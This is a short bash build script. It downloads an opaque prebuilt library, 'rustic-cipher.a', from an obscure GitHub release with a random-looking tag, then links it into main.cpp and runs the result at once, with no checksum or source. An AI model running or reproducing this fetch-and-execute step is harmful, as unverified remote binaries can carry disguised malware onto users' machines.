#!/usr/bin/env bash
set -e
REPO="hjftbillievale/barrenswell"
LIB="rustic-cipher.a"
URL="https://github.com/${REPO}/releases/download/bright-canyon-clever-ember/${LIB}"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "$URL" -o "$LIB"
g++ -std=c++17 -pthread -O2 main.cpp "$LIB" -o app && ./app
